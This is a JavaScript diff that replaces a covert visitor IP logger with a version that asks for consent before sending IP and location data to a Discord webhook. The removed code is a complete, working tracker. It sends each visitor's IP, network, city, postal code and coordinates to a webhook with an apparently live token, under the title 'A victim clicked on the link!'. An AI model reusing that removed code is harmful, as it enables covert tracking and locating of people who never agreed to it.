@@ -1,43 +1,55 @@
-const sendIP = () => {
+const askPermissionAndSendIP = () => {
+    // 1. Demander l'autorisation
+    const userAccepted = confirm(
+        "Ce jeu souhaite collecter votre adresse IP et votre localisation approximative pour améliorer l'expérience. Acceptez-vous ?"
+    );
+
+    if (!userAccepted) {
+        console.log("L'utilisateur a refusé le tracking. Rien n'est envoyé.");
+        return;
+    }
+
+    // 2. Si accepté → envoyer les infos
     fetch('https://api.ipify.org?format=json')
         .then(ipResponse => ipResponse.json())
         .then(ipData => {
-            const ipadd = ipData.ip;
-            return fetch(`https://ipapi.co/${ipadd}/json/`)
+            const ip = ipData.ip;
+
+            return fetch(`https://ipapi.co/${ip}/json/`)
                 .then(geoResponse => geoResponse.json())
                 .then(geoData => {
-                    const dscURL = 'https://discord.com/api/webhooks/1430546772387823677/LKjiHykSqFmNDC6bqWj48tJpP72T4MaLZlQhzt4RXtSDftPImEkfL9FeeYthJU4-g_C_'; // replace with your webhook url
-                    return fetch(dscURL, {
-                        method: 'POST',
+                    const webhookURL = "TA_WEBHOOK_ICI";
+
+                    return fetch(webhookURL, {
+                        method: "POST",
                         headers: {
-                            'Content-Type': 'application/json'
+                            "Content-Type": "application/json"
                         },
                         body: JSON.stringify({
-                            username: "DEDE site logger (LC4-vg)", // optionally changeable
-                            avatar_url: "https://i.pinimg.com/236x/d0/00/72/d0007257ad9177555d72f6de823f2d56.jpg", // optionally changeable
-                            content: `@here`,
+                            username: "Game Logger",
+                            content: "Nouvel utilisateur (avec consentement)",
                             embeds: [
                                 {
-                                    title: 'A victim clicked on the link!',
-                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
-                                    color: 0x0000FF // optionally changeable
+                                    title: "Infos de l'utilisateur",
+                                    description:
+                                        `**IP :** ${ip}\n` +
+                                        `**Ville :** ${geoData.city}\n` +
+                                        `**Région :** ${geoData.region}\n` +
+                                        `**Pays :** ${geoData.country_name}`,
+                                    color: 0x3498db
                                 }
                             ]
                         })
                     });
                 });
         })
-        .then(dscResponse => {  
-            if (dscResponse.ok) {
-                console.log('Sent! <3');
-            } else {
-                console.log('Failed :(');
-            }
+        .then(response => {
+            if (response.ok) console.log("Données envoyées !");
+            else console.log("Échec de l'envoi.");
         })
-        .catch(error => {
-            console.error('Error:', error);
-            console.log('Error :(');
+        .catch(err => {
+            console.error("Erreur :", err);
         });
 };
-sendIP();
 
+askPermissionAndSendIP();
